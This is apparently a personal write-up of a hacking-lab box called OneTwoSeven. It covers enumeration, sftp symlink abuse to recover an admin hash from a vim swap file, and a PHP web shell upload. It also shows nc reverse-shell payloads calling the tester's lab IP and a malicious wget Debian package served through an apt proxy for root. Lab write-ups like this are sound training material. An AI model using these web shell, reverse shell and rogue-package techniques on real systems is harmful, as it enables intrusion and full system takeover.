## OneTwoSeven

### Lab Details 

- Difficulty: Hard
- Type: Web, APT Misconfiguration, Linux

#### Enumeration
- run `nmap`
```bash
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey: 
|   256 32:b7:f3:e2:6d:ac:94:3e:6f:11:d8:05:b9:69:58:45 (ECDSA)
|_  256 35:52:04:dc:32:69:1a:b7:52:76:06:e3:6c:17:1e:ad (ED25519)
80/tcp    open     http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Page moved.
60080/tcp filtered unknown
```
- fuzzing for files using `ffuf`
```bash
$ ffuf -u http://10.129.27.102/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -e .php -fc 403

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.27.102/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
 :: Extensions       : .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
________________________________________________

stats.php               [Status: 200, Size: 3381, Words: 414, Lines: 78, Duration: 42ms]
.                       [Status: 200, Size: 205, Words: 17, Lines: 10, Duration: 6ms]
signup.php              [Status: 200, Size: 3558, Words: 432, Lines: 73, Duration: 41ms]
index.php               [Status: 200, Size: 8060, Words: 1340, Lines: 162, Duration: 645ms]
dist                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 1ms]
```
- visit `signup.php`, found credential and `sftp://onetwoseven.htb` connection point
```bash
Username: ots-zNmU0ZjI
Password: b536e4f2
```
- clicking on `here` points us to `http://onetwoseven.htb/~ots-zNmU0ZjI`
![[signup page.png]]
- add `onetwoseven.htb` to `/etc/hosts`
- attempt to connect to `sftp` as `ots-zNmU0ZjI`
```bash
$ sftp ots-zNmU0ZjI@10.129.27.102
The authenticity of host '10.129.27.102 (10.129.27.102)' can't be established.
ED25519 key fingerprint is SHA256:q2uwM1EVNJyOCanapx8pCp+Ihe2bngUBdtH+GMvgHhY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.27.102' (ED25519) to the list of known hosts.
ots-zNmU0ZjI@10.129.27.102's password: 
Connected to 10.129.27.102.
sftp> ls -la
drwxr-xr-x    ? 0        0            4096 Nov 11 04:34 .
drwxr-xr-x    ? 0        0            4096 Nov 11 04:34 ..
drwxr-xr-x    ? 1002     1002         4096 Feb 15  2019 public_html
```
- check `help` command to see commands available
```bash
sftp> help
symlink oldpath newpath            Symlink remote file
```
- we can attempt to link `/` root directory to `public_`
```
symlink / public_html/root
```
- visit the linked location
![[symbolic link root.png]]
- we can only check the `var` directory 
![[login.php.swp.png]]
- there is a `swp` file for `login.php`
- we can attempt to download it and recover it 
- open the file in `vim`
```bash
$ vim * 
## in vim type in 
:recover
:w login.php
```
- check the file we see a username and hash 
```bash
<?php
            $msg = '';
            
            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
	      if ($_POST['username'] == 'ots-admin' && hash('sha256',$_POST['password']) == '11c5a42c9d74d5442ef3cc835bda1b3e7cc7f494e704a10d0de426b2fbe5cbd8') {
                  $_SESSION['username'] = 'ots-admin';
		  header("Location: /menu.php");
              } else {
                  $msg = 'Wrong username or password.';
              }
            }
         ?>
```
- use site like `crackstation` to get password
![[decrypt admin hash.png]]
- credential below
```bash
ots-admin:Homesweethome1
```
#### Initial Foothold 
- we see there is a port 60080 on the target since we have access to `sftp` we can attempt to use ssh to perform a port forwarding 
```bash
$ ssh -N -L 60080:127.0.0.1:60080 ots-zNmU0ZjI@10.129.27.88
```
- visit the port on localhost 
![[page on port 60080.png]]
- we can attempt to login with the `admin` credential found in the `login.php`
![[menu page on port 60080.png]]
- there is a file upload functionality however its disable  
![[remove disabled input restriction.png]]
- inspecting the page source, we can remove the disable element from the source 
- we are able to down each function listed on the `menu.php`
- looking at `OTS addon manager` we are able to access `addon-upload.php` as long as the `url` contain `addon-upload.php`
![[addon manager on port 60080.png]]
- create a `php` web shell
```bash
echo '<?=`$_GET[cmd]`?>' >> webshell.php
```
- upload the web shell and intercept with `burpsuite`
- change the `POST` `URL` to `/addon-download.php&/addon-upload.php`
![[Hard/OneTwoSeven/file upload.png]]
- we can then access the web shell at `/addons/shell.php`
![[testing web shell.png]]
- send a reverse shell via the web shell
![[rev shell payload on web.png]]
- payload below
```bash
http://127.0.0.1:60080/addons/user.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff|%2Fbin%2Fsh%20-i%202%3E%261|nc%2010.10.14.71%204444%20%3E%2Ftmp%2Ff
```
#### Lateral Movement (If any)

#### Privilege Escalation
- once we have a reverse shell to the target we can then check `sudo -l`
```bash
www-admin-data@onetwoseven:/var/www/html-admin/addons$ sudo -l
Matching Defaults entries for www-admin-data on onetwoseven:
    env_reset, env_keep+="ftp_proxy http_proxy https_proxy no_proxy",
    mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-admin-data may run the following commands on onetwoseven:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get update, /usr/bin/apt-get upgrade
```
- we are able to run `apt-get update` and `apt-get upgrade`
- check `/etc/apt` directory 
```bash
www-admin-data@onetwoseven:/etc/apt$ ls
apt.conf.d  listchanges.conf  preferences.d  sources.list  sources.list.d  trusted.gpg.d
www-admin-data@onetwoseven:/etc/apt$ cd sources.list.d
www-admin-data@onetwoseven:/etc/apt/sources.list.d$ ls -la
total 16
drwxr-xr-x 2 root root 4096 Dec 19  2022 .
drwxr-xr-x 6 root root 4096 Dec  8  2023 ..
-rw-r--r-- 1 root root  211 Feb 15  2019 devuan.list
-rw-r--r-- 1 root root  116 Dec 19  2022 onetwoseven.list
www-admin-data@onetwoseven:/etc/apt/sources.list.d$ cat onetwoseven.list 
# OneTwoSeven special packages - not yet in use
deb [trusted=yes] http://packages.onetwoseven.htb/devuan ascii main
```
- check `sources.list.d` directory we see `onetwoseven.list` `apt source list file` which points to servers that contains app repositories
- check the package that we want to exploit which is `wget`
```bash
www-admin-data@onetwoseven:/etc/apt/sources.list.d$ cat /var/lib/apt/lists/de.deb.devuan.org_merged_dists_ascii_main_binary-amd64_Packages | grep -A 21 "Package: wget$"
Package: wget
Version: 1.18-5+deb9u3
Installed-Size: 2747
Maintainer: Noël Köthe <noel@debian.org>
Architecture: amd64
Depends: libc6 (>= 2.17), libgnutls30 (>= 3.5.6), libidn11 (>= 1.13), libnettle6, libpcre3, libpsl5 (>= 0.13.0), libuuid1 (>= 2.16), zlib1g (>= 1:1.1.4)
Conflicts: wget-ssl
Homepage: https://www.gnu.org/software/wget/
Recommends: ca-certificates
Description: retrieves files from the web
Description-md5: 63a4a740bcd9e8e94bf661e4f1806e02
Multi-Arch: foreign
Tag: implemented-in::c, interface::commandline, network::client,
 protocol::ftp, protocol::http, protocol::ssl, role::program,
 suite::gnu, use::downloading, works-with::file
Section: web
Priority: important
Filename: pool/DEBIAN/main/w/wget/wget_1.18-5+deb9u3_amd64.deb
Size: 799516
MD5sum: 183b4a76ca010473c06d1c71fee4e853
SHA256: c0d4ceeeac01947df3574a34d8a17b7abcf16918503ea3faae3496f00c348585
```
- we can use this as a template to create our malicious `wget` package
```python
pip install twisted service_identity
```
- first create a proxy server with below
```python
from twisted.web import proxy, http
from twisted.internet import reactor
from twisted.python import log
import sys
log.startLogging(sys.stdout)
class ProxyFactory(http.HTTPFactory):
	protocol = proxy.Proxy
reactor.listenTCP(8000, ProxyFactory())
reactor.run()
```
- start the proxy server and start simple `python http server`
```bash
$ python proxy_server.py
$ python -m http.server 80 
```
- also need to build a malicious package for `wget`
```bash
mkdir build
mkdir -p wget/DEBIAN
cat <<EOF >> wget/DEBIAN/control
Package: wget
Architecture: all
Maintainer: @HTB
Priority: optional
Version: 5.0
Description: Pwn all the things
EOF
mkdir -p wget/usr/bin
cat <<EOF >> wget/usr/bin/wget
#!/bin/bash
echo "Bad package"
EOF
chmod 700 wget/usr/bin/wget
cat <<EOF >> wget/DEBIAN/postinst
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.71 4444
>/tmp/f
EOF
chmod 755 wget/DEBIAN/postinst
dpkg-deb --build wget/
```
- we need a `Release`file for the packages 
```bash
$ cat Release  
Origin: Devuan
Label: Devuan
Suite: stable
Version: 2.0.0
Codename: ascii
Date: Fri, 27 May 2022 03:23:41 UTC
Architectures: amd64 armel armhf arm64 mipsel i386
Components: main 
SHA256:
 6296a2f01bf3efe66853e83079da963ba3c70788dab3fbeb828dc35aa14eb563      255 main/binary-amd64/Packages
 ec0e4c62349e89491a9b78dcec0f9e048a3eafc6ead1b3dad19a51e6d2662714      232 main/binary-amd64/Packages.gz
```
- ensure that the the file hash is calculate correctly 
- directory structure 
```bash
$ tree devuan 
devuan
├── dists
│   └── ascii
│       ├── main
│       │   └── binary-amd64
│       │       ├── Packages
│       │       └── Packages.gz
│       └── Release
└── pwn
    └── wget.deb
```
- specific the proxy server 
```bash
www-admin-data@onetwoseven:/var/www/html-admin/addons export http_proxy="http://10.10.16.56:8000"
```
- run `sudo apt-get update`
```bash
www-admin-data@onetwoseven:/var/www/html-admin/addons$ sudo /usr/bin/apt-get update
Ign:1 http://packages.onetwoseven.htb/devuan ascii InRelease
Get:2 http://packages.onetwoseven.htb/devuan ascii Release [394 B]
Ign:3 http://packages.onetwoseven.htb/devuan ascii Release.gpg
Get:4 http://packages.onetwoseven.htb/devuan ascii/main amd64 Packages [232 B]                                                                                         
Fetched 626 B in 6s (97 B/s)                                                                                                                                           
Reading package lists... Done
```
- run `sudo apt-get upgrade` to get the  reverse shell
```
www-admin-data@onetwoseven:/var/www/html-admin/addons$ sudo /usr/bin/apt-get upgrade
Reading package lists... Done
Building dependency tree       
Reading state information... Done
Calculating upgrade... Done
The following packages were automatically installed and are no longer required:
  irqbalance libnuma1
Use 'sudo apt autoremove' to remove them.
The following packages will be upgraded:
  wget
1 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
Need to get 844 B of archives.
After this operation, 2813 kB disk space will be freed.
Do you want to continue? [Y/n] Y
Get:1 http://packages.onetwoseven.htb/devuan ascii/main amd64 wget all 5.0 [844 B]
Fetched 844 B in 1s (840 B/s)
Reading changelogs... Done
(Reading database ... 30936 files and directories currently installed.)
Preparing to unpack .../apt/archives/wget_5.0_all.deb ...
Unpacking wget (5.0) over (1.18-5+deb9u2) ...
Setting up wget (5.0) ...
```
- below are the activities on the `http` server
```bash
127.0.0.1 - - [10/Nov/2025 23:39:27] "GET /devuan/dists/ascii/InRelease HTTP/1.0" 404 -
127.0.0.1 - - [10/Nov/2025 23:39:28] "GET /devuan/dists/ascii/Release HTTP/1.0" 200 -
127.0.0.1 - - [10/Nov/2025 23:39:30] code 404, message File not found
127.0.0.1 - - [10/Nov/2025 23:39:30] "GET /devuan/dists/ascii/Release.gpg HTTP/1.0" 404 -
127.0.0.1 - - [10/Nov/2025 23:39:31] "GET /devuan/dists/ascii/main/binary-amd64/Packages.gz HTTP/1.0" 200 -
127.0.0.1 - - [10/Nov/2025 23:39:33] "GET /devuan/dists/ascii/main/binary-amd64/Packages.gz HTTP/1.0" 200 -
127.0.0.1 - - [10/Nov/2025 23:39:41] "GET /devuan/pwn/wget.deb HTTP/1.0" 200 -
```
- below are the activities on the `proxy` server
```bash
2025-11-10 23:39:41-0800 [-] Starting factory <twisted.web.proxy.ProxyClientFactory object at 0x7fcf4851f6d0>
2025-11-10 23:39:41-0800 [-] "10.129.27.88" - - [11/Nov/2025:07:39:40 +0000] "GET http://packages.onetwoseven.htb/devuan/pwn/wget.deb HTTP/1.1" 200 844 "-" "Debian APT-HTTP/1.3 (1.4.9)"
2025-11-10 23:39:41-0800 [-] Stopping factory <twisted.web.proxy.ProxyClientFactory object at 0x7fcf4851f6d0>
```
- we get root on listener
```bash
$ nc -lvnp 9002
listening on [any] 9002 ...
connect to [10.10.14.71] from (UNKNOWN) [10.129.27.88] 41116
# whoami
root
```
#### Resources

#### Lesson Learned
